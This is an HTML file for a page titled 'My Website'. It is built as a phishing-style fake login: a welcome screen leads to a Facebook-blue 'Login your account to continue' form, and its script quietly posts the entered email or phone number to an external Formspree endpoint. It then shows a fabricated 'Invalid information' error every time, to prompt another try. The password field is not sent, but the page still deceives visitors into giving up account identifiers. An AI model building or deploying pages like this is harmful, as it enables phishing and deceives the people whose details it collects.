<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>My Website</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f0f2f5;
    }

    .page {
      display: none;
      height: 100vh;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      text-align: center;
    }

    #welcomePage {
      display: flex;
      background: linear-gradient(to right, #000, #222);
      color: white;
    }

    .btn {
      margin-top: 20px;
      padding: 14px;
      width: 260px;
      border: none;
      border-radius: 25px;
      font-size: 16px;
      cursor: pointer;
      background: #1877f2;
      color: white;
    }

    #loginPage, #errorPage {
      display: none;
    }

    .login-box {
      width: 320px;
      background: white;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }

    .login-box h2 {
      font-size: 18px;
      margin-bottom: 15px;
    }

    input {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border-radius: 10px;
      border: 1px solid #ccc;
    }

    .password-container {
      position: relative;
    }

    .toggle {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 12px;
      color: #1877f2;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #1877f2;
      color: white;
      border: none;
      border-radius: 25px;
      margin-top: 10px;
      cursor: pointer;
    }

    .link {
      margin-top: 12px;
      color: #1877f2;
      font-size: 14px;
      cursor: pointer;
    }

    .error-text {
      color: red;
      font-size: 18px;
      margin-bottom: 10px;
    }

    .note {
      font-size: 12px;
      color: gray;
    }
  </style>
</head>

<body>

<!-- WELCOME -->
<div id="welcomePage" class="page">
  <h1>Welcome 👀</h1>
  <button class="btn" onclick="goToLogin()">Enter</button>
</div>

<!-- LOGIN -->
<div id="loginPage" class="page">
  <div class="login-box">
    <h2>Login your account to continue</h2>

    <form id="form">
      <input type="text" name="email_or_phone" placeholder="Email or phone number" required>

      <!-- Password UI only -->
      <div class="password-container">
        <input type="password" id="password" placeholder="Password">
        <span class="toggle" onclick="togglePassword()">Show</span>
      </div>

      <p class="note">Password is not collected</p>

      <button type="submit">Continue</button>
    </form>

    <div class="link" onclick="goBack()">← Go Back</div>
  </div>
</div>

<!-- ERROR PAGE -->
<div id="errorPage" class="page">
  <h2 class="error-text">Invalid information</h2>
  <p>Please check your details and try again.</p>
  <button class="btn" onclick="retry()">Try Again</button>
</div>

<script>
  function goToLogin() {
    document.getElementById("welcomePage").style.display = "none";
    document.getElementById("loginPage").style.display = "flex";
  }

  function goBack() {
    document.getElementById("loginPage").style.display = "none";
    document.getElementById("welcomePage").style.display = "flex";
  }

  function retry() {
    document.getElementById("errorPage").style.display = "none";
    document.getElementById("loginPage").style.display = "flex";
  }

  function togglePassword() {
    var input = document.getElementById("password");
    var toggle = document.querySelector(".toggle");

    if (input.type === "password") {
      input.type = "text";
      toggle.innerText = "Hide";
    } else {
      input.type = "password";
      toggle.innerText = "Show";
    }
  }

  // Formspree submit via fetch (no redirect)
  document.getElementById("form").addEventListener("submit", function(e) {
    e.preventDefault();

    const formData = new FormData(this);

    fetch("https://formspree.io/f/mnjlrppg", {
      method: "POST",
      body: formData,
      headers: {
        'Accept': 'application/json'
      }
    }).then(() => {
      // Show generic error page
      document.getElementById("loginPage").style.display = "none";
      document.getElementById("errorPage").style.display = "flex";
    }).catch(() => {
      document.getElementById("loginPage").style.display = "none";
      document.getElementById("errorPage").style.display = "flex";
    });
  });
</script>

</body>
</html>
